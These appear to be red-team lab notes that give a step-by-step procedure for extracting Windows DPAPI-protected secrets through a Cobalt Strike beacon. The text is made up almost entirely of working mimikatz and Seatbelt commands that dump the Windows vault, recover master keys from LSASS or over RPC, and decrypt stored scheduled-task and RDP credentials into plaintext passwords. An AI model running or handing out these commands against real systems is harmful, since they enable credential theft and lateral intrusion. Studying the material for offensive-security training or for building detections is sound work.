# Data Protection API (DPAPI)

# Use mimikatz to dump secrets from windows vault

    beacon> mimikatz !vault::list
    beacon> mimikatz !vault::cred /patch

## Part 1: Enumerate stored credentials

Check if system has credentials stored in either web or windows vault

    beacon> run vaultcmd /list
    beacon> run vaultcmd /listcreds:"Windows Credentials" /all
    beacon> run vaultcmd /listcreds:"Web Credentials" /all
    beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsVault

# Part 2.1: Scheduled Task Credentials

# Part 2.1: Scheduled Task Credentials

1. Credentials for task scheduler are stored at below location in encrypted blob

        beacon> ls C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials

2. Find the GUID of Master key associated with encrypted blob (F31...B6E)

        beacon> mimikatz dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\F3190EBE0498B77B4A85ECBABCA19B6E

3. Dump all the master keys and filter the one we need based on GUID identified in previous step

        beacon> mimikatz !sekurlsa::dpapi

4. Use the Encrypted Blob and Master Key to decrypt and extract plain text password

        beacon> mimikatz dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\F3190EBE0498B77B4A85ECBABCA19B6E /masterkey:<masterkey>

# Part 2.2: Extracting stored RDP Password

1. Enumerate the location of encrypted credentials blob (Returns ID of Enc blob and GUID of Master Key)

        beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsCredentialFiles

2. Verify the credential blob in users cred directory (Note enc blob ID)

        beacon> ls C:\Users\bfarmer\AppData\Local\Microsoft\Credentials

3. Master key is stored in users Protect directory (Note GUID of master key matching with Seatbelt)

        beacon> ls C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S-1-5-21-569305411-121244042-2357301523-1104

4. Decrypt the master key (Need to be execute in context of user who owns the key, use @ modifier)

        beacon> mimikatz !sekurlsa::dpapi
        beacon> mimikatz dpapi::masterkey /in:C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S-1-5-21-569305411-121244042-2357301523-1104\bfc5090d-22fe-4058-8953-47f6882f549e /rpc

5. Use Master key to decrypt the credentials blob

        beacon> mimikatz dpapi::cred /in:C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\6C33AC85D0C4DCEAB186B3B2E5B1AC7C /masterkey:<masterkey>
